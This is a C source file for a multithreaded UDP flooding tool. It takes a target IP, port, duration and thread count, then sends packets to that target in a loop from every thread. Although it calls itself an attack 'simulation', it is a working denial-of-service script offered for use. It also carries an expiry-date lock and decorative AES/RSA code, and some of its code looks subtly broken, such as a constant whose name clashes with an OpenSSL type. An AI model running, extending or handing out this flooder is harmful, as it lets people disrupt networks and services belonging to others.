
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <openssl/aes.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/err.h>

// Expiry date configuration
#define EXPIRY_YEAR 2025
#define EXPIRY_MONTH 3
#define EXPIRY_DAY 1

// Encryption keys for AES and RSA (for demonstration)
const unsigned char AES_KEY[16] = "ThisIsASecretKey";
const unsigned char AES_IV[16] = "InitializationV";
#define RSA_KEY_LENGTH 2048

// Structure for thread arguments
struct thread_data {
    char ip[16];
    int port;
    int duration;
    int thread_id;
};

// Function to check expiry
int check_expiry() {
    time_t now = time(NULL);
    struct tm expiry = {0};
    expiry.tm_year = EXPIRY_YEAR - 1900;
    expiry.tm_mon = EXPIRY_MONTH - 1;
    expiry.tm_mday = EXPIRY_DAY;

    if (difftime(now, mktime(&expiry)) > 0) {
        printf("This program has expired.\n");
        return 1;
    }
    return 0;
}

// AES encryption function
void aes_encrypt(const unsigned char *plaintext, unsigned char *ciphertext) {
    AES_KEY encryptKey;
    AES_set_encrypt_key(AES_KEY, 128, &encryptKey);
    AES_cbc_encrypt(plaintext, ciphertext, strlen((char *)plaintext), &encryptKey, (unsigned char *)AES_IV, AES_ENCRYPT);
}

// RSA key generation
RSA *generate_rsa_key() {
    RSA *rsa = RSA_generate_key(RSA_KEY_LENGTH, RSA_F4, NULL, NULL);
    return rsa;
}

// Function to simulate network attack
void *simulate_attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    unsigned char payload[1024] = "DynamicPayload";
    unsigned char encrypted_payload[1024];
    aes_encrypt(payload, encrypted_payload);

    time_t end_time = time(NULL) + data->duration;

    // Create socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    printf("Thread %d started for IP: %s, Port: %d\n", data->thread_id, data->ip, data->port);

    // Send packets
    while (time(NULL) < end_time) {
        if (sendto(sock, encrypted_payload, sizeof(encrypted_payload), 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Failed to send packet");
            break;
        }
    }

    close(sock);
    pthread_exit(NULL);
}

// Function to print usage instructions
void usage() {
    printf("Usage: ./attack <ip> <port> <duration> <threads>\n");
    exit(1);
}

// Main function
int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    // Check expiry
    if (check_expiry()) {
        return 1;
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    if (threads < 1 || duration < 1 || port < 1 || port > 65535) {
        printf("Invalid arguments.\n");
        usage();
    }

    pthread_t thread_pool[threads];
    struct thread_data thread_args[threads];

    printf("Starting attack on %s:%d for %d seconds using %d threads\n", ip, port, duration, threads);

    for (int i = 0; i < threads; i++) {
        strncpy(thread_args[i].ip, ip, 15);
        thread_args[i].port = port;
        thread_args[i].duration = duration;
        thread_args[i].thread_id = i + 1;

        if (pthread_create(&thread_pool[i], NULL, simulate_attack, &thread_args[i]) != 0) {
            perror("Failed to create thread");
        }
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_pool[i], NULL);
    }

    printf("Attack simulation completed.\n");
    return 0;
}
